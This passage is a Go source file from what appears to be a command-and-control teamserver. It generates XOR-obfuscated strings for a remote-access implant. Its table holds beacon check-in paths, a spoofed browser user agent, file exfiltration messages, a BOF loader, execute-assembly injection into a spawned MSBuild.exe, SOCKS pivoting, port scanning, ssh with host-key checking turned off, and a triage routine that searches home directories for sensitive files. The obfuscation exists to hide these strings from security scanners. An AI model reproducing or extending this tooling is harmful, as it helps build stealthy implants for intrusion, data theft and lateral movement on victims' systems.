// teamserver/obfgen/obfgen.go
package obfgen

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf16"
)

const KeyLen = 8

var xorKey = [KeyLen]byte{0xA3, 0x7F, 0x2C, 0x91, 0xB4, 0x5E, 0xD8, 0x06}

// Key returns a copy of the XOR key (for tests).
func Key() [KeyLen]byte { return xorKey }

type entry struct {
	name   string
	plain  string
	isWide bool
}

var baseEntries = []entry{
	{"SERVER_HOST", "", false},
	{"USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", true},
	{"PATH_PUBKEY", "/api/pubkey", false},
	{"PATH_REGISTER", "/api/register", false},
	{"PATH_CHECKIN", "/api/checkin", false},
	{"PATH_RESULT", "/api/result", false},
	{"CONTENT_TYPE", "Content-Type: application/octet-stream", true},
	{"SHELL_PREFIX", "shell ", false},
	{"CMD_WHOAMI", "whoami", false},
	{"CMD_ID", "id", false},
	{"CMD_HOSTNAME", "hostname", false},
	{"CMD_DOMAIN", "domain", false},
	{"CMD_GETPID", "getpid", false},
	{"CMD_GETINTEGRITY", "getintegrity", false},
	{"CMD_SYSINFO", "sysinfo", false},
	{"CMD_DRIVES", "drives", false},
	{"CMD_ENV", "env", false},
	{"CMD_GETENV", "getenv ", false},
	{"CMD_PWD", "pwd", false},
	{"CMD_CD", "cd", false},
	{"CMD_CD_BARE", "cd", false},
	{"CMD_CD_SP", "cd ", false},
	{"CMD_LS", "ls", false},
	{"CMD_LS_BARE", "ls", false},
	{"CMD_LS_SP", "ls ", false},
	{"CMD_DIR", "dir", false},
	{"CMD_DIR_SP", "dir ", false},
	{"CMD_CAT", "cat ", false},
	{"CMD_STAT", "stat ", false},
	{"CMD_MKDIR", "mkdir ", false},
	{"CMD_RM", "rm ", false},
	{"CMD_RMDIR", "rmdir ", false},
	{"CMD_CP", "cp ", false},
	{"CMD_MV", "mv ", false},
	{"CMD_CHMOD", "chmod ", false},
	{"CMD_PORTSCAN", "portscan ", false},
	{"CMD_CURL", "curl ", false},
	{"CMD_SSH", "ssh ", false},
	{"CMD_TRIAGE", "triagedirectory", false},
	{"CMD_TRIAGE_SP", "triagedirectory ", false},
	{"CMD_PS", "ps", false},
	{"CMD_KILL", "kill ", false},
	{"CMD_IPCONFIG", "ipconfig", false},
	{"CMD_IFCONFIG", "ifconfig", false},
	{"CMD_ARP", "arp", false},
	{"CMD_NETSTAT", "netstat", false},
	{"CMD_DNS", "dns ", false},
	{"CMD_PRIVS", "privs", false},
	{"CMD_GROUPS", "groups", false},
	{"CMD_SERVICES", "services", false},
	{"CMD_UPTIME", "uptime", false},
	{"CMD_REG_QUERY", "reg_query ", false},
	{"CMD_REG_SET", "reg_set ", false},
	{"CMD_CLIPBOARD", "clipboard", false},
	{"CMD_RUNAS", "runas ", false},
	{"HTTP_POST", "POST", false},
	{"HTTP_GET", "GET", false},
	{"EXEC_SHELL_TMPL", "cmd.exe /c %s", false},
	{"REG_HIVE_HKLM", "HKLM\\", false},
	{"REG_HIVE_HKCU", "HKCU\\", false},
	{"REG_HIVE_HKCR", "HKCR\\", false},
	{"REG_HIVE_HKU", "HKU\\", false},

	/* DLL names for LoadLibraryA in dynapi.c */
	{"DLL_KERNEL32", "kernel32.dll", true},
	{"DLL_KERNEL32_A", "kernel32.dll", false},
	{"DLL_WINHTTP", "winhttp.dll", false},
	{"DLL_BCRYPT", "bcrypt.dll", false},
	{"DLL_CRYPT32", "crypt32.dll", false},
	{"DLL_ADVAPI32", "advapi32.dll", false},
	{"DLL_USER32", "user32.dll", false},
	{"DLL_IPHLPAPI", "iphlpapi.dll", false},
	{"DLL_DNSAPI", "dnsapi.dll", false},
	{"DLL_NETAPI32", "netapi32.dll", false},
	{"DLL_WS2_32", "ws2_32.dll", false},
	{"DLL_MSVCRT", "msvcrt.dll", false},

	/* ls */
	{"LS_ERR_ACCESS", "ls: cannot access '%s' (error %lu)\r\n", false},
	{"LS_TAG_DIR", "<DIR>  ", false},
	{"LS_TAG_FILE", "       ", false},

	/* filebrowser */
	{"CMD_FILEBROWSER", "filebrowser ", false},
	{"CMD_FILEBROWSER_BARE", "filebrowser", false},
	{"FB_ERR", "[{\"error\":\"cannot open '%s' (error %lu)\"}]", false},
	{"FB_ENTRY", "{\"name\":\"%s\",\"type\":\"%s\",\"attrs\":\"%s\",\"size\":%llu,\"mtime\":\"%04u-%02u-%02uT%02u:%02u:%02u\"}", false},
	{"FB_TYPE_DIR", "dir", false},
	{"FB_TYPE_FILE", "file", false},

	/* ps */
	{"PS_ERR_SNAP", "ps: snapshot failed (error %lu)\r\n", false},
	{"PS_HDR_FMT", "%-8s  %-30s  %s\r\n%-8s  %-30s  %s\r\n", false},
	{"PS_HDR_PID", "PID", false},
	{"PS_HDR_NAME", "Name", false},
	{"PS_HDR_PPID", "Parent PID", false},
	{"PS_HDR_DIV1", "--------", false},
	{"PS_HDR_DIV2", "----", false},
	{"PS_HDR_DIV3", "----------", false},
	{"PS_ROW_FMT", "%-8lu  %-30s  %lu\r\n", false},

	/* cat */
	{"CAT_ERR_MISSING", "cat: missing file path\r\n", false},
	{"CAT_ERR_OPEN", "cat: cannot open '%s' (error %lu)\r\n", false},

	/* stat */
	{"STAT_ERR_MISSING", "stat: missing path\r\n", false},
	{"STAT_ERR_NOTFOUND", "stat: '%s' not found (error %lu)\r\n", false},
	{"STAT_TYPE_DIR", "Directory", false},
	{"STAT_TYPE_FILE", "File", false},
	{"STAT_FMT", "Path:     %s\r\nType:     %s\r\nSize:     %lld bytes\r\nCreated:  %04u-%02u-%02u %02u:%02u:%02u UTC\r\nModified: %04u-%02u-%02u %02u:%02u:%02u UTC\r\nAccessed: %04u-%02u-%02u %02u:%02u:%02u UTC\r\n", false},

	/* cd */
	{"CD_ERR_CHDIR", "cd: cannot change to '%s' (error %lu)\r\n", false},

	/* sysinfo */
	{"SYSINFO_REGKEY", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false},
	{"SYSINFO_REGVAL_PRODUCT", "ProductName", false},
	{"SYSINFO_REGVAL_BUILD", "CurrentBuildNumber", false},
	{"SYSINFO_PRODUCT_DEFAULT", "Unknown", false},
	{"SYSINFO_ARCH_X64", "x64", false},
	{"SYSINFO_ARCH_X86", "x86", false},
	{"SYSINFO_ARCH_UNK", "unknown", false},
	{"SYSINFO_FMT", "OS:       %s (Build %s)\r\nArch:     %s\r\nRAM:      %lu MB total / %lu MB free\r\nHostname: %s\r\nUser:     %s\r\n", false},

	/* drives */
	{"DRIVES_ERR", "drives: error %lu\r\n", false},
	{"DRIVES_FIXED", "Fixed", false},
	{"DRIVES_REMOVABLE", "Removable", false},
	{"DRIVES_NETWORK", "Network", false},
	{"DRIVES_CDROM", "CD-ROM", false},
	{"DRIVES_RAM", "RAM", false},
	{"DRIVES_UNKNOWN", "Unknown", false},
	{"DRIVES_SPACE_FMT", "  %lu GB total / %lu GB free", false},
	{"DRIVES_ROW_FMT", "%s  %-10s%s\r\n", false},

	/* getintegrity */
	{"INTEG_ERR", "getintegrity: error %lu\r\n", false},
	{"INTEG_ERR_ALLOC", "getintegrity: alloc failed\r\n", false},
	{"INTEG_SYSTEM", "System", false},
	{"INTEG_HIGH", "High", false},
	{"INTEG_MEDIUM", "Medium", false},
	{"INTEG_LOW", "Low", false},
	{"INTEG_FMT", "%s (RID: 0x%lX)\r\n", false},

	/* ipconfig */
	{"IPCONFIG_ERR", "ipconfig: error %lu\r\n", false},
	{"IPCONFIG_ADAPTER", "\r\n[%s]\r\n", false},
	{"IPCONFIG_IPV4", "  IPv4: %u.%u.%u.%u\r\n", false},
	{"IPCONFIG_IPV6", "  IPv6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\r\n", false},

	/* arp */
	{"ARP_ERR", "arp: failed\r\n", false},
	{"ARP_HDR_FMT", "%-16s  %-20s  %s\r\n%-16s  %-20s  %s\r\n", false},
	{"ARP_HDR_IP", "IP Address", false},
	{"ARP_HDR_MAC", "MAC Address", false},
	{"ARP_HDR_TYPE", "Type", false},
	{"ARP_HDR_DIV1", "----------", false},
	{"ARP_HDR_DIV2", "-----------", false},
	{"ARP_HDR_DIV3", "----", false},
	{"ARP_DYNAMIC", "Dynamic", false},
	{"ARP_STATIC", "Static", false},
	{"ARP_OTHER", "Other", false},
	{"ARP_INVALID", "Invalid", false},
	{"ARP_ROW_FMT", "%-16s  %-20s  %s\r\n", false},

	/* tcp states */
	{"TCP_STATE_LISTEN", "LISTEN", false},
	{"TCP_STATE_SYN_SENT", "SYN_SENT", false},
	{"TCP_STATE_SYN_RCVD", "SYN_RCVD", false},
	{"TCP_STATE_ESTABLISHED", "ESTABLISHED", false},
	{"TCP_STATE_FIN_WAIT1", "FIN_WAIT1", false},
	{"TCP_STATE_FIN_WAIT2", "FIN_WAIT2", false},
	{"TCP_STATE_CLOSE_WAIT", "CLOSE_WAIT", false},
	{"TCP_STATE_CLOSING", "CLOSING", false},
	{"TCP_STATE_LAST_ACK", "LAST_ACK", false},
	{"TCP_STATE_TIME_WAIT", "TIME_WAIT", false},
	{"TCP_STATE_UNKNOWN", "UNKNOWN", false},

	/* netstat */
	{"NETSTAT_HDR_FMT", "Proto  %-20s %-20s %-14s PID\r\n", false},
	{"NETSTAT_HDR_LOCAL", "Local", false},
	{"NETSTAT_HDR_REMOTE", "Remote", false},
	{"NETSTAT_HDR_STATE", "State", false},
	{"NETSTAT_TCP_FMT", "TCP    %-20s %-20s %-14s %lu\r\n", false},
	{"NETSTAT_UDP_FMT", "UDP    %-20s %-20s\r\n", false},
	{"NETSTAT_UDP_STAR", "*:*", false},

	/* dns */
	{"DNS_ERR_MISSING", "dns: missing name\r\n", false},
	{"DNS_ERR_QUERY", "dns: query failed (error %ld)\r\n", false},
	{"DNS_AREC_FMT", "  A    %u.%u.%u.%u\r\n", false},
	{"DNS_NO_RECORDS", "dns: no A records\r\n", false},

	/* privs */
	{"PRIVS_ERR", "privs: error %lu\r\n", false},
	{"PRIVS_ERR_ALLOC", "privs: alloc failed\r\n", false},
	{"PRIVS_ERR_GETTOKEN", "privs: GetTokenInformation failed (error %lu)\r\n", false},
	{"PRIVS_ENABLED_DEF", "[Enabled+Default]", false},
	{"PRIVS_ENABLED", "[Enabled]", false},
	{"PRIVS_DEFAULT", "[Default]", false},
	{"PRIVS_DISABLED", "[Disabled]", false},
	{"PRIVS_ROW_FMT", "  %-40s %s\r\n", false},

	/* groups */
	{"GROUPS_ERR_USERNAME", "groups: GetUserNameA failed (error %lu)\r\n", false},
	{"GROUPS_ERR_NETAPI", "groups: NetUserGetLocalGroups failed (error %lu)\r\n", false},
	{"GROUPS_ROW_FMT", "  %s\r\n", false},

	/* services */
	{"SERVICES_ERR_SCM", "services: OpenSCManager failed (error %lu)\r\n", false},
	{"SERVICES_ERR_ALLOC", "services: alloc failed\r\n", false},
	{"SERVICES_RUNNING", "RUNNING", false},
	{"SERVICES_STOPPED", "STOPPED", false},
	{"SERVICES_OTHER_ST", "OTHER", false},
	{"SERVICES_ROW_FMT", "  %-40s  %-8s  PID %lu\r\n", false},

	/* reg_query errors */
	{"REG_QUERY_ERR_HIVE", "reg_query: unknown hive\r\n", false},
	{"REG_QUERY_ERR_OPEN", "reg_query: cannot open key (error %lu)\r\n", false},
	{"REG_QUERY_ERR_NOTFOUND", "reg_query: value not found (error %ld)\r\n", false},

	/* reg_set errors */
	{"REG_SET_ERR_HIVE", "reg_set: unknown hive\r\n", false},
	{"REG_SET_ERR_OPEN", "reg_set: cannot open key (error %lu)\r\n", false},
	{"REG_SET_ERR_FAIL", "reg_set: failed (error %ld)\r\n", false},
	{"REG_SET_OK", "reg_set: OK\r\n", false},

	/* clipboard */
	{"CLIPBOARD_ERR_OPEN", "clipboard: OpenClipboard failed (error %lu)\r\n", false},
	{"CLIPBOARD_EMPTY", "(clipboard is empty)\r\n", false},
	{"CLIPBOARD_ERR_LOCK", "clipboard: GlobalLock failed\r\n", false},

	/* runas */
	{"RUNAS_ERR_FAIL", "runas: failed (error %lu)\r\n", false},

	/* uptime */
	{"UPTIME_FMT", "%llu days, %llu hours, %llu minutes, %llu seconds\r\n", false},

	/* dispatcher inline */
	{"WHOAMI_ERR", "whoami: error %lu\r\n", false},
	{"HOSTNAME_ERR", "hostname: error %lu\r\n", false},
	{"DOMAIN_NOT_JOINED", "(not domain-joined)\r\n", false},
	{"GETENV_ERR", "getenv: '%s' not found\r\n", false},
	{"PWD_ERR", "pwd: error %lu\r\n", false},
	{"MKDIR_ERR", "mkdir: failed (error %lu)\r\n", false},
	{"RMDIR_ERR", "rmdir: failed (error %lu)\r\n", false},
	{"RM_ERR", "rm: failed (error %lu)\r\n", false},
	{"CP_ERR", "cp: failed (error %lu)\r\n", false},
	{"MV_ERR", "mv: failed (error %lu)\r\n", false},
	{"KILL_ERR_OPEN", "kill: cannot open PID %lu (error %lu)\r\n", false},

	/* getpid */
	{"GETPID_FMT", "%lu\r\n", false},

	/* exec */
	{"SHELL_ERR_LONG", "shell: command too long\r\n", false},

	/* ls row format */
	{"LS_ROW_FMT", "%s%s\r\n", false},

	/* arp address formats */
	{"ARP_IP_FMT", "%u.%u.%u.%u", false},
	{"ARP_MAC_FMT", "%02X-%02X-%02X-%02X-%02X-%02X", false},

	/* netstat address format */
	{"NETSTAT_ADDR_FMT", "%u.%u.%u.%u:%u", false},

	/* reg_query value formats */
	{"REG_FMT_SZ", "%s\r\n", false},
	{"REG_FMT_DWORD", "0x%08lX (%lu)\r\n", false},
	{"REG_FMT_HEX", "%02X ", false},

	/* transfer */
	{"EXFIL_ERR_OPEN", "exfil: open failed (0x%08lx)\r\n", false},
	{"EXFIL_ERR_READ", "exfil: read failed (0x%08lx)\r\n", false},

	// SOCKS5 pivoting
	{"SOCKS_CONNECT_FAIL", "socks: connect failed", false},
	{"SOCKS_RESOLVE_FAIL", "socks: resolve failed", false},
	{"SOCKS_SLOTS_FULL", "socks: no free channels", false},

	/* crypto labels */
	{"CRYPTO_AES_CBC", "aes-cbc", false},
	{"CRYPTO_HMAC_SHA256", "hmac-sha256", false},

	/* BCrypt algorithm strings (wide, replace SDK macros) */
	{"BCRYPT_SHA256", "SHA256", true},
	{"BCRYPT_AES", "AES", true},
	{"BCRYPT_CHAIN_MODE", "ChainingMode", true},
	{"BCRYPT_CHAIN_MODE_VAL", "ChainingModeCBC", true},

	/* exec / runas */
	{"FMT_PID_EXIT", "pid=%lu exit=%lu", false},

	/* ls pattern strings */
	{"DIR_WILDCARD", ".\\*", false},
	{"DIR_FMT_STAR", "%s*", false},
	{"DIR_FMT_BSLASH_STAR", "%s\\*", false},

	/* ls dot-skip strings */
	{"DOT", ".", false},
	{"DOTDOT", "..", false},

	/* DLL extension for forward-export resolution */
	{"DLL_EXT", ".dll", false},

	// BOF loader
	{"BOF_BEACON_PRINTF", "BeaconPrintf", false},
	{"BOF_BEACON_OUTPUT", "BeaconOutput", false},
	{"BOF_BEACON_DATA_PARSE", "BeaconDataParse", false},
	{"BOF_BEACON_DATA_EXTRACT", "BeaconDataExtract", false},
	{"BOF_BEACON_DATA_INT", "BeaconDataInt", false},
	{"BOF_BEACON_DATA_SHORT", "BeaconDataShort", false},
	{"BOF_BEACON_DATA_LENGTH", "BeaconDataLength", false},
	{"BOF_BEACON_DATA_PTR", "BeaconDataPtr", false},
	{"BOF_BEACON_FORMAT_ALLOC", "BeaconFormatAlloc", false},
	{"BOF_BEACON_FORMAT_RESET", "BeaconFormatReset", false},
	{"BOF_BEACON_FORMAT_FREE", "BeaconFormatFree", false},
	{"BOF_BEACON_FORMAT_APPEND", "BeaconFormatAppend", false},
	{"BOF_BEACON_FORMAT_PRINTF", "BeaconFormatPrintf", false},
	{"BOF_BEACON_FORMAT_TO_STRING", "BeaconFormatToString", false},
	{"BOF_BEACON_FORMAT_INT", "BeaconFormatInt", false},
	{"BOF_TO_WIDE_CHAR", "toWideChar", false},
	{"BOF_IMPORT_PREFIX", "__imp_", false},
	{"BOF_ENTRY_GO", "go", false},
	{"BOF_LOAD_LIBRARY_A", "LoadLibraryA", false},
	{"BOF_GET_PROC_ADDRESS", "GetProcAddress", false},
	{"BOF_FREE_LIBRARY", "FreeLibrary", false},
	{"BOF_SET_LAST_ERROR", "SetLastError", false},
	{"BOF_LSTRCAT_W", "lstrcatW", false},
	{"BOF_MEMSET", "memset", false},
	{"BOF_STRLEN", "strlen", false},
	{"BOF_ERR_REQUEST", "bof: invalid request", false},
	{"BOF_ERR_COFF", "bof: invalid x64 COFF", false},
	{"BOF_ERR_ALLOC", "bof: allocation failed", false},
	{"BOF_ERR_SYMBOL", "bof: unresolved symbol", false},
	{"BOF_ERR_SYMBOL_DETAIL", "bof: unresolved symbol: ", false},
	{"BOF_ERR_RELOC", "bof: unsupported relocation", false},
	{"BOF_ERR_GO", "bof: missing go", false},
	{"BOF_ERR_RUN", "bof: execution failed", false},

	// execute-assembly
	{"EXEC_ASM_SPAWNTO", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", false},
	{"EXEC_ASM_ERR_PIPE", "exec-asm: pipe creation failed\r\n", false},
	{"EXEC_ASM_ERR_PROC", "exec-asm: process creation failed\r\n", false},
	{"EXEC_ASM_ERR_INJECT", "exec-asm: injection failed\r\n", false},
	{"EXEC_ASM_ERR_THREAD", "exec-asm: thread creation failed\r\n", false},
	{"EXEC_ASM_TIMEOUT", "exec-asm: timeout (120s)\r\n", false},

	/* Linux session/shell */
	{name: "BIN_BASH", plain: "/bin/bash", isWide: false},
	{name: "BIN_SH", plain: "/bin/sh", isWide: false},
	{name: "SHELL_STARTED", plain: "shell started", isWide: false},
	{name: "SHELL_EXITED", plain: "shell exited", isWide: false},
	{name: "UNKNOWN_TASK", plain: "unknown task", isWide: false},

	/* Linux http/exec/main */
	{name: "LX_HTTP_REQ_LINE", plain: "%s %s HTTP/1.1\r\n", isWide: false},
	{name: "LX_HOST_HDR", plain: "Host: %s:%s\r\n", isWide: false},
	{name: "LX_UA_HDR", plain: "User-Agent: %s\r\n", isWide: false},
	{name: "LX_CT_HDR", plain: "Content-Type: %s\r\n", isWide: false},
	{name: "LX_CL_HDR", plain: "Content-Length: %zu\r\n", isWide: false},
	{name: "LX_CONN_CLOSE", plain: "Connection: close\r\n", isWide: false},
	{name: "LX_CONTENT_LENGTH", plain: "content-length:", isWide: false},
	{name: "LX_DASH_C", plain: "-c", isWide: false},
	{name: "LX_EXEC_EMPTY", plain: "exec: empty command", isWide: false},
	{name: "LX_FORK_FAILED", plain: "fork failed", isWide: false},
	{name: "LX_CMD_TIMEOUT", plain: "\n[command timed out after 30s]", isWide: false},
	{name: "LX_FORK_PIPE_ERR", plain: "fork failed: pipe error", isWide: false},
	{name: "LX_PROC_SELF_EXE", plain: "/proc/self/exe", isWide: false},
	{name: "LX_TASK_UNSUP", plain: "task type %d not supported on Linux", isWide: false},
	{name: "LX_EXITING", plain: "exiting", isWide: false},
	{name: "LX_SLEEP_UPDATED", plain: "sleep updated", isWide: false},

	/* Linux crypto/transfer */
	{name: "LX_EXFIL_ERR_OPEN", plain: "exfil: open failed (%s)", isWide: false},
	{name: "LX_EXFIL_ERR_STAT", plain: "exfil: stat failed", isWide: false},
	{name: "LX_EXFIL_ERR_READ", plain: "exfil: read failed (%s)", isWide: false},
	{name: "LX_STAGE_ERR_CREATE", plain: "stage: cannot create '%s' (%s)", isWide: false},

	/* ---- Linux builtin.c strings ---- */

	/* rm flags */
	{name: "LX_RM_RF_SP", plain: "-rf ", isWide: false},
	{name: "LX_RM_FR_SP", plain: "-fr ", isWide: false},
	{name: "LX_RM_R_SP", plain: "-r ", isWide: false},
	{name: "LX_RM_R", plain: "-r", isWide: false},
	{name: "LX_RM_RF", plain: "-rf", isWide: false},
	{name: "LX_RM_FR", plain: "-fr", isWide: false},

	/* mv cross-device check */
	{name: "LX_COPIED_COLON", plain: "copied:", isWide: false},

	/* proc filesystem paths */
	{name: "LX_PROC", plain: "/proc", isWide: false},
	{name: "LX_PROC_PID_STAT", plain: "/proc/%d/stat", isWide: false},
	{name: "LX_PROC_PID_STATUS", plain: "/proc/%d/status", isWide: false},
	{name: "LX_PROC_PID_CMDLINE", plain: "/proc/%d/cmdline", isWide: false},
	{name: "LX_PROC_PID_FD", plain: "/proc/%ld/fd", isWide: false},
	{name: "LX_PROC_PID_FD_ENT", plain: "/proc/%ld/fd/%s", isWide: false},
	{name: "LX_PROC_PID_COMM", plain: "/proc/%d/comm", isWide: false},
	{name: "LX_PROC_NET_TCP", plain: "/proc/net/tcp", isWide: false},
	{name: "LX_PROC_NET_TCP6", plain: "/proc/net/tcp6", isWide: false},
	{name: "LX_PROC_NET_UDP", plain: "/proc/net/udp", isWide: false},
	{name: "LX_PROC_NET_UDP6", plain: "/proc/net/udp6", isWide: false},
	{name: "LX_SOCKET_INODE", plain: "socket:[%lu]", isWide: false},

	/* sysfs path */
	{name: "LX_SYS_NET_ADDR", plain: "/sys/class/net/%s/address", isWide: false},

	/* skip dirs for triage */
	{name: "LX_SYS", plain: "/sys", isWide: false},
	{name: "LX_DEV", plain: "/dev", isWide: false},
	{name: "LX_RUN", plain: "/run", isWide: false},

	/* triage walk roots */
	{name: "LX_HOME", plain: "/home", isWide: false},
	{name: "LX_ROOT", plain: "/root", isWide: false},

	/* /proc/[pid]/status field */
	{name: "LX_UID_NL", plain: "\nUid:", isWide: false},
	{name: "LX_UID_BARE", plain: "Uid:", isWide: false},

	/* output labels and format strings */
	{name: "LX_HOSTNAME_LABEL", plain: "hostname: %s\n", isWide: false},
	{name: "LX_KERNEL_LABEL", plain: "kernel: %s %s %s\n", isWide: false},
	{name: "LX_GETCWD_ERR", plain: "getcwd: %s\n", isWide: false},

	/* usage strings */
	{name: "LX_USAGE_GETENV", plain: "usage: getenv <VAR>\n", isWide: false},
	{name: "LX_USAGE_MKDIR", plain: "usage: mkdir <path>\n", isWide: false},
	{name: "LX_USAGE_CHMOD", plain: "usage: chmod <mode> <path>\n", isWide: false},
	{name: "LX_USAGE_KILL", plain: "usage: kill [-<sig>] <pid>\n", isWide: false},
	{name: "LX_USAGE_RM", plain: "usage: rm [-r|-rf] <path>\n", isWide: false},
	{name: "LX_USAGE_CP", plain: "usage: cp <src> <dst>\n", isWide: false},
	{name: "LX_USAGE_MV", plain: "usage: mv <src> <dst>\n", isWide: false},
	{name: "LX_USAGE_CAT", plain: "usage: cat <file>\n", isWide: false},
	{name: "LX_USAGE_SSH", plain: "usage: ssh user@host [command]\n", isWide: false},
	{name: "LX_USAGE_CURL", plain: "usage: curl <url>\n", isWide: false},
	{name: "LX_USAGE_PORTSCAN", plain: "usage: portscan <host|cidr> <ports>\n", isWide: false},
	{name: "LX_USAGE_PORTSCAN2", plain: "  e.g. portscan 192.168.1.1 22,80,443\n       portscan 192.168.1.0/24 1-1024\n", isWide: false},

	/* error prefixes */
	{name: "LX_CD_ERR", plain: "cd: %s: %s\n", isWide: false},
	{name: "LX_NOT_SET", plain: "%s: not set\n", isWide: false},
	{name: "LX_MKDIR_ERR", plain: "mkdir: %s: %s\n", isWide: false},
	{name: "LX_CREATED", plain: "created: %s\n", isWide: false},
	{name: "LX_CHMOD_INVAL", plain: "chmod: invalid mode '%s'\n", isWide: false},
	{name: "LX_CHMOD_ERR", plain: "chmod: %s: %s\n", isWide: false},
	{name: "LX_CHMOD_OK", plain: "chmod: %s -> 0%lo\n", isWide: false},
	{name: "LX_KILL_INVAL_SIG", plain: "kill: invalid signal '%s'\n", isWide: false},
	{name: "LX_KILL_INVAL_PID", plain: "kill: invalid pid '%s'\n", isWide: false},
	{name: "LX_KILL_PERM", plain: "kill: %d: permission denied\n", isWide: false},
	{name: "LX_KILL_NOSUCH", plain: "kill: %d: no such process\n", isWide: false},
	{name: "LX_KILL_ERR", plain: "kill: %d: %s\n", isWide: false},
	{name: "LX_KILLED", plain: "killed PID %d with signal %d\n", isWide: false},
	{name: "LX_PS_MALLOC", plain: "ps: malloc failed\n", isWide: false},
	{name: "LX_PS_OPENPROC", plain: "ps: cannot open /proc: %s\n", isWide: false},
	{name: "LX_LS_GETCWD", plain: "ls: getcwd failed: %s\n", isWide: false},
	{name: "LX_LS_ERR", plain: "ls: %s: %s\n", isWide: false},
	{name: "LX_CAT_ERR", plain: "cat: %s: %s\n", isWide: false},
	{name: "LX_CAT_TOOLARGE", plain: "cat: file too large (max 1MB)\n", isWide: false},
	{name: "LX_RM_ERR", plain: "rm: %s: %s\n", isWide: false},
	{name: "LX_RM_ISDIR", plain: "rm: %s: is a directory (use -r)\n", isWide: false},
	{name: "LX_RM_PARTIAL", plain: "rm: %s: some entries could not be removed\n", isWide: false},
	{name: "LX_REMOVED", plain: "removed: %s\n", isWide: false},
	{name: "LX_CP_ERR", plain: "cp: %s: %s\n", isWide: false},
	{name: "LX_CP_FSTAT_ERR", plain: "cp: fstat(%s): %s\n", isWide: false},
	{name: "LX_CP_WRITE_ERR", plain: "cp: write error: %s\n", isWide: false},
	{name: "LX_COPIED", plain: "copied: %s -> %s (%lld bytes)\n", isWide: false},
	{name: "LX_MOVED", plain: "moved: %s -> %s\n", isWide: false},
	{name: "LX_MV_ERR", plain: "mv: %s -> %s: %s\n", isWide: false},
	{name: "LX_MV_XDEV", plain: "mv: cross-device copy failed: %s\n", isWide: false},
	{name: "LX_IFCONFIG_ERR", plain: "ifconfig: getifaddrs: %s\n", isWide: false},
	{name: "LX_PORTSCAN_INVAL", plain: "portscan: invalid host or port spec\n", isWide: false},
	{name: "LX_SCAN_COMPLETE", plain: "Scan complete: %d open port(s) (%d host(s) scanned)\n", isWide: false},
	{name: "LX_TRIAGE_FOUND", plain: "\nFound %d sensitive file(s) in %d category/categories\n", isWide: false},

	/* curl errors and protocol */
	{name: "LX_CURL_NO_HTTPS", plain: "curl: https not supported in builtin, use download\n", isWide: false},
	{name: "LX_CURL_INVAL_URL", plain: "curl: invalid URL\n", isWide: false},
	{name: "LX_CURL_RESOLVE", plain: "curl: cannot resolve '%s'\n", isWide: false},
	{name: "LX_CURL_SOCKET", plain: "curl: socket: %s\n", isWide: false},
	{name: "LX_CURL_CONNECT", plain: "curl: connect %s:%d: %s\n", isWide: false},
	{name: "LX_CURL_SEND_ERR", plain: "curl: send error: %s\n", isWide: false},
	{name: "LX_HTTP_GET_REQ", plain: "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", isWide: false},
	{name: "LX_HTTP_PREFIX", plain: "http://", isWide: false},
	{name: "LX_HTTPS_PREFIX", plain: "https://", isWide: false},

	/* ssh options */
	{name: "LX_SSH_CMD", plain: "ssh", isWide: false},
	{name: "LX_SSH_OPT_O", plain: "-o", isWide: false},
	{name: "LX_SSH_STRICTHOST", plain: "StrictHostKeyChecking=no", isWide: false},
	{name: "LX_SSH_BATCH", plain: "BatchMode=yes", isWide: false},
	{name: "LX_SSH_TIMEOUT", plain: "ConnectTimeout=10", isWide: false},
	{name: "LX_SSH_PIPE_ERR", plain: "ssh: pipe: %s\n", isWide: false},
	{name: "LX_SSH_FORK_ERR", plain: "ssh: fork: %s\n", isWide: false},

	/* ifconfig labels */
	{name: "LX_INET", plain: "  inet  %s/%d\n", isWide: false},
	{name: "LX_INET6", plain: "  inet6 %s/%d\n", isWide: false},
	{name: "LX_ETHER", plain: "  ether %s\n", isWide: false},
	{name: "LX_FLAGS", plain: "  flags:", isWide: false},
	{name: "LX_FLAG_UP", plain: " UP", isWide: false},
	{name: "LX_FLAG_RUNNING", plain: " RUNNING", isWide: false},
	{name: "LX_FLAG_LOOP", plain: " LOOPBACK", isWide: false},

	/* netstat labels */
	{name: "LX_NETSTAT_HDR", plain: "PROTO", isWide: false},
	{name: "LX_NETSTAT_LOCAL", plain: "LOCAL", isWide: false},
	{name: "LX_NETSTAT_REMOTE", plain: "REMOTE", isWide: false},
	{name: "LX_NETSTAT_STATE", plain: "STATE", isWide: false},
	{name: "LX_NETSTAT_PID", plain: "PID", isWide: false},
	{name: "LX_NETSTAT_PROC", plain: "PROCESS", isWide: false},
	{name: "LX_PROTO_TCP", plain: "tcp", isWide: false},
	{name: "LX_PROTO_TCP6", plain: "tcp6", isWide: false},
	{name: "LX_PROTO_UDP", plain: "udp", isWide: false},
	{name: "LX_PROTO_UDP6", plain: "udp6", isWide: false},

	/* tcp state names */
	{name: "LX_ST_ESTABLISHED", plain: "ESTABLISHED", isWide: false},
	{name: "LX_ST_SYN_SENT", plain: "SYN_SENT", isWide: false},
	{name: "LX_ST_SYN_RECV", plain: "SYN_RECV", isWide: false},
	{name: "LX_ST_FIN_WAIT1", plain: "FIN_WAIT1", isWide: false},
	{name: "LX_ST_FIN_WAIT2", plain: "FIN_WAIT2", isWide: false},
	{name: "LX_ST_TIME_WAIT", plain: "TIME_WAIT", isWide: false},
	{name: "LX_ST_CLOSE", plain: "CLOSE", isWide: false},
	{name: "LX_ST_CLOSE_WAIT", plain: "CLOSE_WAIT", isWide: false},
	{name: "LX_ST_LAST_ACK", plain: "LAST_ACK", isWide: false},
	{name: "LX_ST_LISTEN", plain: "LISTEN", isWide: false},
	{name: "LX_ST_CLOSING", plain: "CLOSING", isWide: false},
	{name: "LX_ST_UNKNOWN", plain: "UNKNOWN", isWide: false},

	/* ps table header */
	{name: "LX_PS_HDR_PID", plain: "PID", isWide: false},
	{name: "LX_PS_HDR_PPID", plain: "PPID", isWide: false},
	{name: "LX_PS_HDR_USER", plain: "USER", isWide: false},
	{name: "LX_PS_HDR_STATE", plain: "STATE", isWide: false},
	{name: "LX_PS_HDR_CMD", plain: "COMMAND", isWide: false},

	/* portscan output */
